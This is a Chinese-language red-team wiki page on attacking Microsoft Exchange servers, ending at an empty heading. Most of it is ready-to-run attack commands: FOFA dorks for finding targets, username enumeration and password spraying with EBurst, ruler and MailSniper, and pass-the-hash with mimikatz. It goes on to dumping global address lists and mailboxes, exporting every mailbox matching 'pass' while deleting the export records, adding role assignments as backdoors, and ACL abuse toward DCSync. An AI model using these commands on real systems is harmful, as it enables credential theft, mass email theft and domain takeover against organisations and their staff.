# Exchange

<p align="center">
    <img src="../../../../../assets/img/banner/Exchange.png">
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**简介**

Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。简单而言， Exchange server 可以被用来构架应用于企业、学校的邮件系统。Exchange server 还是一个协作平台。在此基础上可以开发工作流，知识管理系统，Web 系统或者是其他消息系统。

**相关文章**
- [渗透测试中的Exchange](https://www.anquanke.com/post/id/226543)
- [渗透技巧——获得Exchange GlobalAddressList的方法](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Exchange-GlobalAddressList%E7%9A%84%E6%96%B9%E6%B3%95/)
- [Exchange漏洞攻略来啦！！](https://mp.weixin.qq.com/s/EIiYn4cr_PmPT8YgiDAfaQ)
- [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
- [细数微软Exchange的那些高危漏洞](https://mp.weixin.qq.com/s/O9SFufxz0rtAJtcP32giog)
- [深入Exchange Server在网络渗透下的利用方法](https://www.freebuf.com/articles/web/193132.html)
- [Exchange在渗透测试中的利用](https://evi1cg.me/archives/Exchange_Hack.html)
- [Exchange EWS接口的利用](https://www.t00ls.net/thread-62442-1-3.html)
- [针对Exchange的攻击方式](https://tttang.com/archive/1487/)
- [各个阶段 Exchange 的利用手法](https://mp.weixin.qq.com/s/6rPQD6zTVrqwOIREMAavpQ)
- [『红蓝对抗』Exchange的渗透流程（一）](https://mp.weixin.qq.com/s/yU0LGNI-D30VZ3A89p1x-A)
- [Exchange 暴力破解与防范](https://mp.weixin.qq.com/s/WF2kHt4MKvjwnj92W4f8Xw)
- [渗透基础——获得Exchange服务器的内网IP](https://3gstudent.github.io//%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%8E%B7%E5%BE%97Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%86%85%E7%BD%91IP)
- [【技术原创】渗透基础——Exchange版本探测的优化](https://www.4hou.com/posts/WBwx)

**状况检查**
- [dpaulson45/HealthChecker](https://github.com/dpaulson45/HealthChecker) - Exchange Server 运行状况检查脚本
- [microsoft/CSS-Exchange](https://github.com/microsoft/CSS-Exchange) - Exchange Server支持工具和脚本,用于检测各类问题

**环境搭建**
- [Exchange搭建](../../../../Integrated/Windows/实验/Exchange搭建.md)

---

## Dork

```
microsoft exchange 2013：
app="Microsoft-Exchange-2013"||app="Microsoft-Exchange-Server-2013-CU21"||app="Microsoft-Exchange-Server-2013-CU17"||app="Microsoft-Exchange-Server-2013-CU23"||app="Microsoft-Exchange-Server-2013-CU13"||app="Microsoft-Exchange-Server-2013-CU22"||app="Microsoft-Exchange-Server-2013-CU11"||app="Microsoft-Exchange-Server-2013-CU2"||app="Microsoft-Exchange-Server-2013-CU16"||app="Microsoft-Exchange-Server-2013-CU19"||app="Microsoft-Exchange-Server-2013-CU3"||app="Microsoft-Exchange-Server-2013-CU18"||app="Microsoft-Exchange-Server-2013-CU5"||app="Microsoft-Exchange-Server-2013-CU20"||app="Microsoft-Exchange-Server-2013-CU12"||app="Microsoft-Exchange-Server-2013-CU15"||app="Microsoft-Exchange-Server-2013-CU10"||app="Microsoft-Exchange-Server-2013-CU9"||app="Microsoft-Exchange-Server-2013-CU6"||app="Microsoft-Exchange-Server-2013-CU7"||app="Microsoft-Exchange-Server-2013-CU1"||app="Microsoft-Exchange-Server-2013-CU14"||app="Microsoft-Exchange-Server-2013-CU8"||app="Microsoft-Exchange-Server-2013-RTM"||app="Microsoft-Exchange-Server-2013-SP1"||app="Microsoft-Exchange-2013"

microsoft exchange 2016：
app="Microsoft-Exchange-Server-2016-CU19"||app="Microsoft-Exchange-Server-2016-CU3"||app="Microsoft-Exchange-Server-2016-CU12"||app="Microsoft-Exchange-Server-2016-RTM"||app="Microsoft-Exchange-Server-2016-CU7"||app="Microsoft-Exchange-Server-2016-CU17"||app="Microsoft-Exchange-Server-2016-CU2"||app="Microsoft-Exchange-Server-2016-CU1"||app="Microsoft-Exchange-Server-2016-CU14"||app="Microsoft-Exchange-Server-2016-CU5"||app="Microsoft-Exchange-Server-2016-CU11"||app="Microsoft-Exchange-Server-2016-CU9"||app="Microsoft-Exchange-Server-2016-CU16"||app="Microsoft-Exchange-Server-2016-CU10"||app="Microsoft-Exchange-Server-2016-CU6"||app="Microsoft-Exchange-Server-2016-CU13"||app="Microsoft-Exchange-Server-2016-CU18"||app="Microsoft-Exchange-Server-2016-CU8"||app="Microsoft-Exchange-Server-2016-CU4"||app="Microsoft-Exchange-2016-POP3-server"

microsoft exchange 2019：
app="Microsoft-Exchange-Server-2019-CU5"||app="Microsoft-Exchange-Server-2019-CU3"||app="Microsoft-Exchange-Server-2019-Preview"||app="Microsoft-Exchange-Server-2019-CU8"||app="Microsoft-Exchange-Server-2019-CU1"||app="Microsoft-Exchange-Server-2019-CU7"||app="Microsoft-Exchange-Server-2019-CU2"||app="Microsoft-Exchange-Server-2019-CU6"||app="Microsoft-Exchange-Server-2019-RTM"||app="Microsoft-Exchange-Server-2019-CU4"

microsoft exchange 2010：
app="Microsoft-Exchange-2010-POP3-server-version-03.1"||app="Microsoft-Exchange-Server-2010"
```

- [ysecurity/checkO365](https://github.com/vysecurity/checkO365) - 检查目标域是否正在使用 Office365 的工具

---

## 版本识别

1. 在登录界面查看网页源代码：

    ![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/9.png)

    其中 15.1.2106.2 就是当前 exchange 的版本，在 Mircosoft 网站上根据版本号就可以直接查询：
    - https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019

2. 请求 /owa、/owa/service 等路径，在返回头 X-OWA-Version： 中查看完整的内部版本号，比如 15.1.2375.7

3. 直接访问 /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application，下载下来的 xml 文档中会包含完整的内部版本号

**相关工具**
- https://github.com/3gstudent/Homework-of-Python/blob/master/Exchange_GetVersion_ParseFromWebsite.py

---

## 域内定位 Exchange 服务器

**ldap 定位**

在域内可以使用 ldap 定位, 过滤规则
```
"(objectCategory=msExchExchangeServer)"
```

**spn 定位**

通过 spn 来定位，windows 自带 setspn。
```
setspn -q */*

setspn -Q IMAP/*

setspn -Q exchange*/*
```

通过 DNS 查询定位
```
nslookup.exe -type=srv _autodiscover._tcp
```

---

## 信息泄露

**IP**
- 访问以下接口,HTTP 协议版本修改成 1.0，去掉 http 头里面的 HOST 参数
    ```
    /OWA
    /Autodiscover
    /Exchange
    /ecp
    /aspnet_client
    ```

- msf
    ```bash
    use auxiliary/scanner/http/owa_iis_internal_ip
    # 脚本里面限定了内网IP范围,如果企业是自定义的内网IP,可能无法获取到IP,https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/owa_iis_internal_ip.rb#L79
    ```

- nmap
    ```bash
    nmap x.x.x.x -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
    ```

- python
    - https://3gstudent.github.io//%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%8E%B7%E5%BE%97Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%86%85%E7%BD%91IP

---

## 爆破

通常情况下,Exchange 系统是不对邮箱登录次数做限制,利用大字典来进行爆破,是最为常见的突破方法。

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/1.png)

Exchange 邮箱的登录账号分为三种形式, 分别为 “domain\username”、“username” 和“user@domain（邮件地址）”, 这三种方式可以并存使用, 也可以限制具体一种或两种使用。

具体使用哪一种用户名登录可以根据登录口的提示确定, 但这并不百分百准确, 管理员通过修改配置或者登录页面, 可以自行设置登录方式, 和提示说明。因此如果直接使用 owa 页面爆破, 用户名需要尝试全部三种方式。

爆破方式使用 burp 即可, 通过返回包长短即可判断成功与否。

对于某些限制登录次数的网站, 还可以尝试对其 NTLM 验证接口进行爆破, 最常见的就是 ews 接口, 但除此之外，还有以下接口地址。

- HTTP 直接认证

    ```
    /ecp                            # Exchange 管理中心,管理员用于管理组织中的Exchange 的Web控制台
    /owa                            # Exchange owa 接口,用于通过web应用程序访问邮件、日历、任务和联系人等
    ```

- HTTP NTLM 认证

    ```
    /Autodiscover/Autodiscover.xml  # 自 Exchange Server 2007 开始推出的一项自动服务,用于自动配置用户在Outlook中邮箱的相关设置,简化用户登录使用邮箱的流程。
    /Microsoft-Server-ActiveSync/default.eas
    /Microsoft-Server-ActiveSync    # 用于移动应用程序访问电子邮件
    /Autodiscover
    /Rpc/                           # 早期的 Outlook 还使用称为 Outlook Anywhere 的 RPC 交互
    /EWS/Exchange.asmx
    /EWS/Services.wsdl
    /EWS/                           # Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互
    /OAB/                           # 用于为Outlook客户端提供地址簿的副本,减轻 Exchange 的负担
    /Mapi                           # Outlook连接 Exchange 的默认方式,在2013和2013之后开始使用,2010 sp2同样支持
    /powershell                     # 用于服务器管理的 Exchange 管理控制台
    ```
    由于这些接口支持 NTLM 认证，因此也能 pth 域用户账户。甚至，`/rpc` 接口的 `[MS-OXNSPI]` 协议还能 pth 域机器账户。

爆破邮箱账户步骤,首先确定目标 AD 域名，再爆破用户名，最后爆破密码。值得一提的是，不是每个域用户都有邮箱账户，邮箱账户需要 Exchange 管理员手动给域用户添加。如果密码爆破成功后出现 `未找到 ISLAND\domain_admin 的邮箱` 的提示，则说明该账户未开通邮箱，但这个账户也是有效的域用户账户。

可以利用以下工具进行爆破

- [APT34 Exchange 爆破工具](https://github.com/blackorbird/APT_REPORT/blob/master/APT34/Jason.zip)
- [grayddq/EBurst](https://github.com/grayddq/EBurst) - 这个脚本主要提供对 Exchange 邮件服务器的账户爆破功能，集成了现有主流接口的爆破方式。
- [sensepost/ruler](https://github.com/sensepost/ruler) - 爆破 Exchange
    ```
    ./ruler --domain https://targetdomain.com/autodiscover/autodiscover.xml -k brute --users /path/to/user.txt --passwords /path/to/passwords.txt -v --threads 5 --delay 0
    ```

### 获取 AD 域名

在 Windows 进行 NTLM 认证时，无论输入的凭证是否正确，返回的 ntlmssp 包中都会带上大量系统相关信息：包括 NetBIOS 域名、NetBIOS 机器名、DNS 域名、DNS 机器名等。攻击者需要从 HTTP NTLM 认证的接口泄露 AD 域名，来配合接下来的用户名爆破。

```
# 指定要访问的接口，解析返回的 ntlmssp 包
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews -p 443 192.168.123.123
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/Autodiscover -p 443 192.168.123.123

# MailSniper.ps1，仅支持 /Autodiscover /ews 两个接口
Invoke-DomainHarvestOWA -ExchHostname 192.168.123.123
```

### 用户名爆破

Exchange 存在基于时间的用户名枚举问题，Exchange 2016 版本的表现为：爆破到真实存在的域用户（无论是否开通邮箱账户）时，其响应开始接收时间会更短（不是完整响应时间）。

经过传统的邮箱收集加上一定的高频用户名形成用户名字典后，需要为字典设置三种格式：domain\username、username、user@domain。Exchange 管理员可以任意配置使用一种或多种格式，因此爆破的时候最好带上所有格式。

- Burp 爆破

    在没有验证码或者可以绕过的情况下，用 burp 爆破 /ecp、/owa 接口，在爆破结果中选择 Intruder -> Columns -> Response received，查看响应开始接收时间更短的用户名，即存在的域用户。

- 脚本爆破

    ```bash
    # MailSniper.ps1
    # 支持 /owa、/Microsoft-Server-ActiveSync
    Invoke-UsernameHarvestEAS -ExchHostname 192.168.123.123 -Domain island.com -UserList username.txt -Threads 1 -OutFile owa-valid-users.txt
    Invoke-UsernameHarvestOWA -ExchHostname 192.168.123.123 -Domain island.com -UserList username.txt -Threads 1 -OutFile owa-valid-users.txt
    ```

- SMTP

    通过 SMTP 协议枚举：邮箱存在会返回 250，不存在返回 500。但如果目标邮服配置了 Catch-all 邮箱，则所有发往目标邮服的无效邮箱都会被 Catch-all 邮箱接收，即无论邮箱是否存在都会返回 250。

### 密码喷洒

在获得 AD 域名和存在的用户名后，可以通过多个接口爆破 Exchange。

- Burp 爆破

    在没有验证码或者可以绕过的情况下，用 burp 爆破 `/ecp`、`/owa` 接口。

- 脚本爆破

    ```bash
    # EBurst 最推荐
    # EBurst 支持所有接口爆破，-C 检查目标开放的接口，再指定存活接口爆破。建议 /ews 或默认
    python2 EBurst.py -d 192.168.123.123 -L username.txt -p 123456 -T 10
    python2 EBurst.py -d 192.168.123.123 -C

    # MailSniper.ps1 仅支持 /OWA /EWS /Microsoft-Server-ActiveSync 接口，推荐 /ews
    Invoke-PasswordSprayEWS -ExchHostname 192.168.123.123 -UserList .\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt
    Invoke-PasswordSprayOWA -ExchHostname 192.168.123.123 -UserList .\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt
    Invoke-PasswordSprayEAS -ExchHostname 192.168.123.123 -UserList .\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt
    ```

---

## Post Exchange

### ecp 管理

exchange server 默认将其管理页面入口 Exchange Admin Center（ecp）和其正常邮箱登录口 Outlook Web Access（owa）一同发布。默认登录地址为 https://domain/ecp/

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/5.png)

**权限**

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/6.png)

域管 administrator 默认为邮箱管理员,但邮箱管理员和域管其实并无关系。添加邮箱管理员不会修改用户域内权限。

**搜索**

合规性管理 ——> 就地电子数据展示和保留 ——> 添加规则

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/7.png)

**委托**

设置权限将邮箱委托给指定用户管理使用。

ecp ——> 收件人 ——> 目标用户 ——> 邮件委托 ——> 完全访问添加指定用户

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/8.png)

### 邮箱列表导出

**GlobalAddressList**

Exchange 存在一个全局地址列表（GAL），所有邮箱地址都位列其中。获得任一邮箱用户凭证后，可以多种方式获取 GAL，即能用于后续钓鱼，也能用于扩大爆破范围。

#### /OWA 直接导出

```
登录后,选择联系人->All Users。
https://x.x.x.x/owa/#path=/people
使用该目录获取通讯录列表, 可以通过 burp 修改返回邮件地址数量导出。一般不推荐
```

#### Offline Address Book (OAB)

/OAB 本身就是地址集合列表的副本。首先需要构造包访问 /Autodiscover 获取具体的 /OAB/xxx/oab.xml，然后下载其中的 .lzx 文件，最后通过 oabextract 解析后得到其中的 SMTP 地址信息。

/Autodiscover 除了会返回 oab.xml 地址外，还会返回域控地址。

访问 ：`https://<domain>/autodiscover/autodiscover.xml`

```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: test.f8x.com
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.10730; Pro)
Authorization: Basic Q09OVE9TT1x1c2VyMDE6UEBzc3cwcmQ=
Content-Length: 341
Content-Type: text/xml

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
    <EMailAddress>test@f8x.com</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/2.png)

请求 `<OABUrl>/oab.xml` 页面并列出 OAB 文件：

![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/3.png)

找到其中 Default Global Address List (默认全局地址列表) 对应的 lzx 文件名称，lzx 文件名称为 fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx

下载 lzx 文件
```
win-4j4l8gp7bf2.f8x.com/OAB/b6eaa1c0-d7f5-4619-ad8d-b453f967353b/fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx
```

对 lzx 文件解码，还原出 Default Global Address List
```
wget http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract
chmod +x oabextract
./oabextract fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx gal.oab
strings gal.oab|grep SMTP
```

#### ldap

```
ldapsearch -x -H ldap://$IP:389 -D "CN=$username,CN=Users,DC=f8x,DC=com" -w $password -b "DC=f8x,DC=com" |grep mail:
```

Windows 系统通过 PowerView 获取所有用户邮件地址
```
$uname=$username
$pwd=ConvertTo-SecureString $password -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)
Get-NetUser -Domain f8x.com -DomainController $IP -ADSpath "LDAP://DC=f8x,DC=com" -Credential $cred | fl mail
```

#### 域内查询

域内查询可以使用传统的内网渗透方式导出域用户。也可以使用域管直接远程操作 Exchange 导出邮箱地址。

```
$User = "f8x\administrator"
$Pass = ConvertTo-SecureString -AsPlainText DomainAdmin123! -Force
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://Exchange01.f8x.com/PowerShell/ -Authentication Kerberos -Credential $Credential
Import-PSSession $Session -AllowClobber
Get-Mailbox|fl PrimarySmtpAddress
Remove-PSSession $Session
```

#### /mapi

[sensepost/ruler](https://github.com/sensepost/ruler) - ruler 主要通过 /mapi 模拟 Outlook 通信，通过 /Autodiscover 实现与 Outlook 类似的自动配置能力，ruler 会自动发现 Exchange 域内的域名并访问。但如果攻击者处于域外的话，会因为 DNS 无法解析导致攻击失败，需要攻击者手动配置域名解析。

```
ruler --insecure --url https://MAIL/autodiscover/autodiscover.xml --email test@test.com -u test -p 密码 --verbose --debug abk dump -o list.txt
```

```
ruler-win64.exe --insecure --url https://192.168.123.123/autodiscover/autodiscover.xml --email zhangsan@island.com -u zhangsan -p ZS@123qwe --verbose --debug abk list
ruler-win64.exe --insecure --url https://192.168.123.123/autodiscover/autodiscover.xml --email zhangsan@island.com -u zhangsan --hash 82b6413f42426e0b40e6d0674eb16299 --verbose --debug abk list
```

#### /EWS

[dafthack/MailSniper](https://github.com/dafthack/MailSniper) - 通过 /EWS 指定搜索条件获取 GAL，类似于爆破，很慢。

```
Get-GlobalAddressList -ExchHostname MAIL -UserName CORP\test -Password 密码 -OutFile global-address-list.txt
```

```
# MailSniper.ps1
Get-GlobalAddressList -ExchHostname 192.168.123.123 -username island.com\lisi -password LS@123qwe -OutFile global-address-list.txt
```

#### /rpc

[impacket](https://github.com/SecureAuthCorp/impacket) - 通过 /RPC 接口配合 [MS-OXNSPI] 和 [MS-NSPI] 协议直接获取 AD 中的地址簿信息，最快。

```
python3 exchanger.py DOMAIN/test:密码@MAIL nspi list-tables
python3 exchanger.py DOMAIN/test:密码@MAIL nspi dump-tables -guid xxxx
```
```
python3 exchanger.py island.com/zhangsan@192.168.123.123 -hashes :82b6413f42426e0b40e6d0674eb16299 nspi list-tables
python3 exchanger.py island.com/zhangsan:ZS@123qwe@192.168.123.123 nspi list-tables -count
python3 exchanger.py island.com/zhangsan:ZS@123qwe@192.168.123.123 nspi dump-tables -guid dd5c6c6e-f050-4fef-b91f-4ac4cb16d5cb
```

---

### 邮件导出

如果爆出了密码，直接 web 端访问 /OWA 登录查看。

如果获得了 hash，可以 pth 后 Invoke-SelfSearch 访问 /ews 查看：
```bash
# MailSniper.ps1
# 指定 lisi 的账密查询 lisi 的所有邮件
Invoke-SelfSearch -Folder all -Mailbox lisi@island.com -ExchHostname win2012-ex2016.island.com -MailsPerUser 500 -Terms "*password*","*creds*","*credentials*","*测试*","*密码*","*拓扑*","*运维*","*VPN*","*账号*" -OutputCsv lisi-email-search.csv -Remote -User island.com\lisi -Password LS@123qwe

# 用当前会话的默认凭证搜索 zhangsan 的所有邮件
# 配合 mimikatz 实现 pth 后搜索
Invoke-SelfSearch -Folder all -Mailbox zhangsan@island.com -ExchHostname win2012-ex2016.island.com -MailsPerUser 500 -Terms "*password*","*creds*","*credentials*","*测试*","*密码*","*拓扑*","*运维*","*VPN*","*账号*" -OutputCsv zhangsan-email-search.csv
```

**相关工具**
- [b0bac/GetMail](https://github.com/b0bac/GetMail) - 利用NTLM Hash读取Exchange邮件

---

### 搜索共享文件

老版本 Exchange 支持查看域内文件共享，且支持移动端通过 `/Microsoft-Server-ActiveSync` 远程访问网络内部的共享文件。在 Exchange 2010 及其后续版本中，删除了 Outlook 的文件共享权限，但通过 `/Microsoft-Server-ActiveSync` 接口依然可以。

```bash
# UNC 路径仅支持主机名，不支持 IP 和 FQDN
python2 -m peas 192.168.123.123
python2 -m peas 192.168.123.123 -u island.com\zhangsan -p ZS@123qwe --check
python2 -m peas 192.168.123.123 -u island.com\zhangsan -p ZS@123qwe --list-unc="\\WIN2012-DC1"
```

在实战中，如果已经拿下域机器了，这个手法的使用意义不大。但是如果在域外，或者是直接攻击互联网上的 Exchange，这种手法不失为一种收集共享文件的方法，配合下面的方法收集域内所有主机名再查询共享文件效果更佳。

---

### 搜索域信息

/rpc 接口支持各种远程调用，其中包括 `[MS-OXNSPI]` 协议，该协议用于客户端从 Exchange 服务器获取 OAB 数据。Exchange 本身并不存储地址簿数据，而是通过 `[MS-NSPI]` 协议与域控通信，访问 Active Directory 来获取地址簿数据。

`[MS-OXNSPI]` 和 `[MS-NSPI]` 协议都是用于获取地址簿数据的，区别是前者用于客户端与 Exchange 通信，后者用于 Exchange 与域控通信。因此，`[MS-NSPI]` 也是继 LDAP 和 `[MS-DRSR]`（也称为 DcSync 和 DRSUAPI）之后第三个访问 Active Directory 的网络协议。

遗憾的是，`[MS-OXNSPI]` 和 `[MS-NSPI]` 并不能获取全部的 Active Directory 属性，而是 X.500 空间集的属性。而且，根据微软文档描述，这两个协议仅用于获取 AD（Active Directory） 中的地址簿数据，而不能访问整个 AD 条目。不过研究人员发现，可以通过爆破 DNT（Distinguished Name Tags）的方式遍历全部 AD 条目，但是依然无法获取额外的 AD 属性。

```bash
# 需要修改 exchanger.py，否则保存的时候可能会报解码错误。
class Exchanger:
    ......
    ......
    def set_output_file(self, filename):
        self.__outputFileName = filename
        # self.__outputFd = open(self.__outputFileName, 'w+')
        self.__outputFd = open(self.__outputFileName, 'w+', encoding="utf-8") # 添加 encoding="utf-8"

# impacket
python3 exchanger.py island.com/zhangsan:ZS@123qwe@192.168.60.116 nspi dnt-lookup -start-dnt 0 -stop-dnt 100000 -lookup-type FULL -output-file dnt.txt
```

在实战中，如果已经在域内了，这个手法的使用意义不大，因为 `[MS-NSPI]` 返回的 X.500 属性不像 AD 中的那么全，不能等同于 LDAP。但是如果在域外或者是直接攻击互联网上的 Exchange，可以搜索 objectSid 来发现域内机器账户，配合 /Microsoft-Server-ActiveSync 遍历主机名查询共享文件。

---

### 管理 Exchange

#### 已有高权限域账号

通常创建 Exchange 的那个域账号会被加入 Exchange Organization Administrators 或 Organization Management 组（不同版本组名不同），如果拿到该组成员的凭证，可以使用 /PowerShell 接口对 Exchange 进行远程管理。
```bash
# 设置明文凭证并连接
$User = "island.com\enterprise_admin"
$Pass = ConvertTo-SecureString -AsPlainText EA@123qwe -Force
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://win2012-ex2016.island.com/PowerShell -Authentication Kerberos -Credential $Credential
Import-PSSession $Session -AllowClobber

# 测试是否成功
Get-Mailbox

# 删除连接
Remove-PSSession $Session
```

如果没有明文密码，只有 Hash，可以用 mimikatz pth。
```
mimikatz.exe privilege::debug "sekurlsa::pth /user:enterprise_admin /domain:island.com /ntlm:d81a42dfacbaf5e346eb9a072773309d /run:powershell" exit
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://win2012-ex2016.island.com/PowerShell
Import-PSSession $Session -AllowClobber
最好域内操作，走代理可能报错。
```

#### 已有 Exchange 服务器权限

拿到服务器权限后，有两种方式对 Exchange 进行管理。

1. 通过 Exchange Management Shell 进行管理

    这是一个封装好的 .ps 脚本，其原理也是使用 /PowerShell 接口对 Exchange 进行远程管理，默认使用当前凭证创建 PSSession。

2. 打开 Powershell 加载网络管理单元，不同版本 Exchange 加载语句不同：
    ```bash
    # Exchange 2007
    Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;

    # Exchange 2010
    Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;

    # Exchange 2013 & 2016
    Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
    ```

#### 语法所需权限

通过各种方式连接上 Exchange 管理端后，会自动加载大量的 Exchange Cmdlet。Exchange 通过基于角色的访问控制（RBAC）进行权限管理，用户拥有相应的角色才可以使用对应的 Exchange Cmdlet，否则在连接阶段就不会获取没有权限的 Exchange Cmdlet。下面语句描述如何查看某个 Cmdlet 所需角色，并为用户赋予该角色，让其可以执行该 Cmdlet：

```bash
# 查看所有 Exchange Cmdlet
Get-ExCommand

# 查看执行某个 Cmdlet 所需的角色
Get-ManagementRole -Cmdlet New-ManagementRoleAssignment

# 给某个用户赋予所需角色，让其可以执行某个 Cmdlet
New-ManagementRoleAssignment -Role "Role Management" -User zhangsan -Name "Role Management Back"

# 查看角色授权是否成功
Get-ManagementRoleAssignment -Role "Role Management"|Format-List

# 删除某个角色授权
Remove-ManagementRoleAssignment -Identity "Role Management Back" -Confirm:$false
需要注意的是，Get-ManagementRole 和 Get-ManagementRoleAssignment 需要 Role Management 角色，而该角色一般被分配给 Organization Management 角色组。

# Exchange 管理端添加 Exchange 管理员
Add-RoleGroupMember "Organization Management" -Member zhangsan -BypassSecurityGroupManagerCheck
Add-RoleGroupMember "Exchange Organization Administrators" -Member zhangsan -BypassSecurityGroupManagerCheck

# 域管添加 Exchange 管理员
net groups "Organization Management" zhangsan /DOMAIN /ADD
net groups "Exchange Organization Administrators" zhangsan /DOMAIN /ADD

# 将用户加入 Role Management 组，可以任意添加角色，相当于后门
New-ManagementRoleAssignment -Role "Role Management" -User zhangsan -Name "Role Management Back"
```
添加特定的角色后，攻击者就可以进行管理员级别的信息收集。

#### 统计信息

```bash
# 查看所有邮箱信息，默认显示邮件数量、最后登录时间
Get-Mailbox -ResultSize unlimited | Get-MailboxStatistics

# 查看 zhangsan 的发件箱详情
Get-MessageTrackingLog -Start "01/11/2019 09:00:00" -Sender "zhangsan@island.com" -EventID SEND |Format-Table Timestamp,ClientIp,ClientHostname,EventId,Sender,Recipients,MessageSubject
```

#### 全局搜索

两种方式搜索全局邮件，/PowerShell 或 /EWS。

1. 通过 /PowerShell 查询

如果用户拥有 Mailbox Import Export 和 Mailbox Search 角色则可以使用搜索和导出相关的 Cmdlet，老版本 Exchange 中这两个角色默认没有分配给任何用户或角色组，包括 Organization Management 组。在实战中，通常需要先用 Organization Management 组用户登录管理接口，给自己赋予这两个角色，再重新连接自动从远程会话获取相应 Cmdlet。
```
# 赋予角色，需要重新连接才能从远程会话获取相应 cmdlet
New-ManagementRoleAssignment -Role "Mailbox Search" -User enterprise_admin
New-ManagementRoleAssignment -Role "Mailbox Import Export" -User enterprise_admin

# 删除角色
Remove-ManagementRoleAssignment -Identity "Mailbox Search-enterprise_admin" -Confirm:$false
Remove-ManagementRoleAssignment -Identity "Mailbox Import Export-enterprise_admin" -Confirm:$false

# 导出所有邮箱正文中带 pass 的邮件，localhost 为 Exchange 服务器
Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -Mailbox $_.name -CompletedRequestAgeLimit 0 -ContentFilter {(body -like "*pass*")} -FilePath ("\\localhost\c$\test\"+($_.name)+".pst")}

# 删除导出记录，导出时不加 CompletedRequestAgeLimit 参数会留下导出记录
Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false

# 搜索所有邮件，SearchQuery 只支持向后匹配，也可以匹配邮件其他位置比如收件人、发件人、CC 等
Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{Search-Mailbox -Identity $_.name -SearchQuery "pass*" -TargetMailbox "zhangsan" -TargetFolder "outAll" -LogLevel Suppress}
```

2. 通过 /EWS 查询

如果用户拥有 ApplicationImpersonation 角色则可以模拟其他用户登录 /EWS，进而通过 /EWS 编程实现搜索所有邮件的功能。在实战中，通常需要先用 Organization Management 组用户登录管理接口，给自己赋予这个角色，再通过 /EWS 搜索邮件。

这里修改了 MailSniper 脚本，优化授权生效时间、新增匹配附件名、优化输出内容、新增指定账密等：
```bash
# MailSniper.ps1
# 搜索所有邮件，需要提供管理员账号给用户授予 ApplicationImpersonation 权限
Invoke-GlobalMailSearch -Folder all -ImpersonationAccount enterprise_admin -ExchHostname win2012-ex2016.island.com -AdminUserName enterprise_admin -AdminPassword EA@123qwe -MailsPerUser 500 -Terms "*password*","*creds*","*credentials*","*测试*","*密码*","*拓扑*","*运维*","*VPN*","*账号*" -OutputCsv global-email-search.csv
```

---

### 攻击域管

#### ACL (已有 Exchange 服务器权限)

**描述**

在 Exchange 安装完后，域内会添加一个名为 Microsoft Exchange Security Groups 的 OU，其包括两个特殊的组：Exchange Windows Permissions 和 Exchange Trusted Subsystem，后者隶属于前者。所有的 Exchange 服务器都会加入 Exchange Trusted Subsystem 组，也就是 Exchange 服务器都继承了 Exchange Windows Permissions 组的权限，而该组拥有对域分区的 WriteDacl 权限，且可以继承。因此，在拿下 Exchange 服务器后，可以利用 Exchange 机器账户对域分区添加任意 ACL 进行提权，比如添加 Dcsync 权限导出域内所有 Hash。

**相关文章**
